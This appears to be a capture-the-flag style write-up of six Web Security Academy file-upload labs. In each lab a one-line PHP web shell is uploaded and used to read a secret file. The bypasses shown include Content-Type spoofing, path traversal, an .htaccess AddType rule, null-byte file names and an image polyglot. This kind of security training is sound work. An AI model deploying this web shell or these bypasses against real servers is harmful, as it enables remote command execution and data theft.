# %% [markdown]
# # **Remote code execution via web shell upload Lab :**
#
#  * **Lab's Objective :** upload a basic PHP web shell and use it to exfiltrate the contents of the file ```/home/carlos/secret```
#
#  * **Givens :**
#
#      * lab contains a vulnerable image upload function , doesn't perform any validation on the files users upload before storing them on the server's filesystem
#
#      * **Credentials :** ```wiener:peter```
#
# ***
#
#  * Go to **```My account```** and Login Using Provided Credentials ```wiener:peter```
#
#  * There is a **```Browse```** Button Used to Upload Avatar Image , Click it and Upload any Image :
#
#      * Uploaded Successfully
#
#  * Open Burp's HTTP History , Search for **```POST /my-account/avatar```** and Send it to The Repeater :
#
#      * Try to Change Avatar's Extension to .php at Parameter **```filename=""```** and Send The Request :
#
#          * Uploaded Successfully
#
#      * Now Craft a PHP Shell Like The Following one :
#
#          ```php
#          <?php
#          system($_GET['cmd']);
#          ?>
#          ```
#
#          * This is a PHP script that runs system commands from user input For Example :
#              * http://yourserver.com/script.php?cmd=whoami
#
#                  * This Command displays the current user's username
#
#          * This PHP Shell Work as a PoC for RCE
#
#
#      * Upload PHP Shell , then Open The Avatar's Image in a New Tab and add **```cmd```** parameter to the URL With any Command For Example :
#
#          * https://Lab-ID.web-security-academy.net/files/avatars/Shell.php?cmd=whoami
#
#              * The Response is **```carlos```**
#
#
#          * Now Let's Get the Contents of **```/home/carlos/secret```**
#
#              * https://Lab-ID.web-security-academy.net/files/avatars/Shell.php?cmd=cat /home/carlos/secret
#
#
#          * Submit The Solution you Have Found
#
#
# ***
# ***
# ***
#
# # **Web shell upload via Content-Type restriction bypass Lab :**
#
#
#  * **Lab's Objective :** upload a basic PHP web shell and use it to exfiltrate the contents of the file ```/home/carlos/secret```
#
#  * **Givens :**
#
#      * lab contains a vulnerable image upload function , It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this
#
#      * **Credentials :** ```wiener:peter```
#
#
# ***
#
#  * Go to **```My account```** and Login Using Provided Credentials ```wiener:peter```
#
#  * There is a **```Browse```** Button Used to Upload Avatar Image , Click it and Upload any Image :
#
#      * Uploaded Successfully
#
#  * Open Burp's HTTP History , Search for **```POST /my-account/avatar```** and Send it to The Repeater :
#
#      * Try to Change Avatar's Extension to .php at Parameter **```filename=""```** and Send The Request :
#
#          * Sent Successfully
#
#
#  * Now Upload You PHP Shell :
#
#      * **```Sorry, file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed```**
#
#      * Open Burp's HTTP History Get **```POST /my-account/avatar```** for Uploading PHP Shell, Send it to The Repeater and Change the **```Content-Type```**  Header to One of The Allowed for Example **```Content-Type: image/jpeg```** and Send The Request :
#
#          * **```The file avatars/Shell.php has been uploaded```**
#
#
#      * Open The Avatar's Image in a New Tab and add **```cmd```** parameter to the URL With any Command For Example :
#
#          * https://Lab-ID.web-security-academy.net/files/avatars/Shell.php?cmd=whoami
#
#              * The Response is **```carlos```**
#
#
#          * Now Let's Get the Contents of **```/home/carlos/secret```**
#
#              * https://Lab-ID.web-security-academy.net/files/avatars/Shell.php?cmd=cat /home/carlos/secret
#
#
#          * Submit The Solution you Have Found
#
#
# ***
# ***
# ***
#
# # **Web shell upload via path traversal Lab :**
#
#  * **Lab's Objective :** upload a basic PHP web shell and use it to exfiltrate the contents of the file ```/home/carlos/secret```
#
#  * **Givens :**
#
#      * lab contains a vulnerable image upload function , The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability
#
#      * **Credentials :** ```wiener:peter```
#
# ***
#
#  * Go to **```My account```** and Login Using Provided Credentials ```wiener:peter```
#
#  * There is a **```Browse```** Button Used to Upload Avatar Image , Click it and Upload any Image :
#
#      * Uploaded Successfully
#
#  * Open Burp's HTTP History , Search for **```POST /my-account/avatar```** and Send it to The Repeater :
#
#      * Try to Change Avatar's Extension to .php via Parameter **```filename=""```** and Send The Request :
#
#          * Sent Successfully
#
#
#  * Now Upload You PHP Shell :
#
#      * Uploaded Successfully
#
#      * Open The Avatar's Image in a New Tab and add **```cmd```** parameter to the URL With any Command For Example :
#
#          * https://Lab-ID.web-security-academy.net/files/avatars/Shell.php?cmd=whoami
#
#              * There is No Response (Code not Executed in This Directory ```/avatars/```)
#
#
#      * So Let's Try to Execute the Shell Somewhere Else :
#
#          * Open Burp's HTTP History and Get Shell File Uploading Request and Send it To The Repeater :
#
#              * Change File Name to ../FileName.php and Send The Request :
#
#                  * **```The file avatars/Shell.php has been uploaded```**
#
#              * Encode / and Send The Request again :
#
#                  * **```The file avatars/../Shell.php has been uploaded```**
#
#
#              * Now **```cmd```** parameter to the URL With any Command For Example :
#
#          * https://Lab-ID.web-security-academy.net/files/avatars/../Shell.php?cmd=whoami
#
#              * The Response is **```carlos```**
#
#          * Now Let's Get the Contents of **```/home/carlos/secret```**
#
#              * https://Lab-ID.web-security-academy.net/files/avatars/../Shell.php?cmd=cat /home/carlos/secret
#
#
#          * Submit The Solution you Have Found
#
#
# ***
# ***
# ***
#
# # **Web shell upload via extension blacklist bypass Lab :**
#
#  * **Lab's Objective :** upload a basic PHP web shell and use it to exfiltrate the contents of the file ```/home/carlos/secret```
#
#  * **Givens :**
#
#      * lab contains a vulnerable image upload function , Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist
#
#      * **Credentials :** ```wiener:peter```
#
# ***
#
#  * Go to **```My account```** and Login Using Provided Credentials ```wiener:peter```
#
#  * There is a **```Browse```** Button Used to Upload Avatar Image , Click it and Upload any Image :
#
#      * Uploaded Successfully
#
#  * Open Burp's HTTP History , Search for **```POST /my-account/avatar```** and Send it to The Repeater :
#
#      * Try to Change Avatar's Extension to .php via Parameter **```filename=""```** and Send The Request :
#
#          * **```php files are not allowed```**
#
#      * Let's Try Alternative Uncommon Extensions for .php (<a href="https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology">Click Here</a> To Find)
#
#          * .php5 Extensions Bypassed The Restriction
#
#      * Upload PHP Shell and Intercept this Uploading Request and Change .php Extension to .php5 and Stop Intercepting :
#
#          * Uploaded Successfully
#
#
#      * Open The Avatar's Image in a New Tab and add **```cmd```** parameter to the URL With any Command For Example :
#
#          * https://Lab-ID.web-security-academy.net/files/avatars/Shell.php5?cmd=whoami
#
#              * There is No Response (Not Executed)
#
#
#      * There is another Alternative for .php => **```.htaccess```** :
#
#          * configuration file used by Apache web servers to control directory-level settings
#
#          * It allows you to configure server behavior for a specific directory without modifying the global server configuration file
#
#      * Now Change filename to .htaccess and Upload file With The Following Content :
#
#          * <a href="https://raw.githubusercontent.com/wireghoul/htshells/master/shell/mod_php.shell.htaccess">Click Here</a>
#
#              * **```.htaccess```** used to tell the Apache web server to treat files with a specific extension  as PHP files, so that the server processes them with the PHP interpreter
#
#          * Uploaded Successfully
#
#          * Open That .htaccess File :
#
#              * **```Forbidden```**
#
#          * Now Change the Content of the .htaccess File to The Following and Send The Request again :
#
#              * ```AddType application/x-httpd-php .random```
#
#                  * any File With .random Extension will Be Treated as PHP File
#
#              * Uploaded Successfully
#
#
#      * Now Upload PHP Shell and Intercept this Uploading Request and Change .php Extension to .random and Stop Intercepting :
#
#          * Uploaded Successfully
#
#      * Open The Avatar's Image in a New Tab and add **```cmd```** parameter to the URL With any Command For Example :
#
#          * https://Lab-ID.web-security-academy.net/files/avatars/Shell.random?cmd=whoami
#
#              * The Response is **```carlos```**
#
#          * Now Let's Get the Contents of **```/home/carlos/secret```**
#
#              * https://Lab-ID.web-security-academy.net/files/avatars/Shell.random?cmd=cat /home/carlos/secret
#
#
#          * Submit The Solution you Have Found
#
#
# ***
# ***
# ***
#
# # **Web shell upload via obfuscated file extension Lab :**
#
#
#  * **Lab's Objective :** upload a basic PHP web shell and use it to exfiltrate the contents of the file ```/home/carlos/secret```
#
#  * **Givens :**
#
#      * lab contains a vulnerable image upload function , Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique
#
#      * **Credentials :** ```wiener:peter```
#
# ***
#
#
#  * Go to **```My account```** and Login Using Provided Credentials ```wiener:peter```
#
#  * There is a **```Browse```** Button Used to Upload Avatar Image , Click it and Upload any Image :
#
#      * Uploaded Successfully
#
#  * Open Burp's HTTP History , Search for **```POST /my-account/avatar```** and Send it to The Repeater :
#
#      * Try to Change Avatar's Extension to .php via Parameter **```filename=""```** and Send The Request :
#
#          * **```only JPG & PNG files are allowed```**
#
#      * We Need to Bypass That White-Listing Restriction :
#
#          * Using **```NULL Byte Injection```** => FileName.NotAllowedEx%00.AllowedEx
#
#          * Now Upload PHP Shell and Intercept this Uploading Request and Change filename to **```Shell.php%00.jpg```** and Stop Intercepting :
#
#              * Uploaded Successfully as Shell.php
#
#          * Open The Avatar's Image in a New Tab and add **```cmd```** parameter to the URL With any Command For Example :
#
#              * https://Lab-ID.web-security-academy.net/files/avatars/Shell.php?cmd=whoami
#
#                  * The Response is **```carlos```**
#
#              * Now Let's Get the Contents of **```/home/carlos/secret```**
#
#                  * https://Lab-ID.web-security-academy.net/files/avatars/Shell.php?cmd=cat /home/carlos/secret
#
#
#              * Submit The Solution you Have Found
#
# ***
# ***
# ***
#
# # **Remote code execution via polyglot web shell upload Lab :**
#
#  * **Lab's Objective :** upload a basic PHP web shell and use it to exfiltrate the contents of the file ```/home/carlos/secret```
#
#  * **Givens :**
#
#      * lab contains a vulnerable image upload function ,  Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code
#
#      * **Credentials :** ```wiener:peter```
#
# ***
#
#
#  * Go to **```My account```** and Login Using Provided Credentials ```wiener:peter```
#
#  * There is a **```Browse```** Button Used to Upload Avatar Image , Click it and Upload any Image :
#
#      * Uploaded Successfully
#
#  * Open Burp's HTTP History , Search for **```POST /my-account/avatar```** and Send it to The Repeater :
#
#      * Try to Change Avatar's Extension to .php via Parameter **```filename=""```** and Send The Request :
#
#          * Uploaded Successfully
#
#
#  * Now Upload You PHP Shell :
#
#      * **```Error: file is not a valid image Sorry, there was an error uploading your file```**
#
#          * It Seems That The Web Server Checks The Actual Content of Uploaded File :
#
#              * What if We Changed **Content-Type** to Valid One (image/jpeg) :
#
#                  * Error
#
#
#              * Let's Try **```Tampering with Magic Number```** , Inject Magic Number of Images to the beginning of shell code :
#
#                  * Error
#
#              * What if We Inject Our Shell Content inside the Content of Real Image :
#
#                  * Uploaded Successfully (if You Checked The Avatar is Corrupted)
#
#
#              * Open The Avatar's Image in a New Tab and add **```cmd```** parameter to the URL With any Command For Example :
#
#              * https://Lab-ID.web-security-academy.net/files/avatars/RealImage.php?cmd=whoami
#
#                  * The Response is **```carlos```**
#
#              * Now Let's Get the Contents of **```/home/carlos/secret```**
#
#                  * https://Lab-ID.web-security-academy.net/files/avatars/RealImage.php?cmd=cat /home/carlos/secret
#
#
#              * Submit The Solution you Have Found
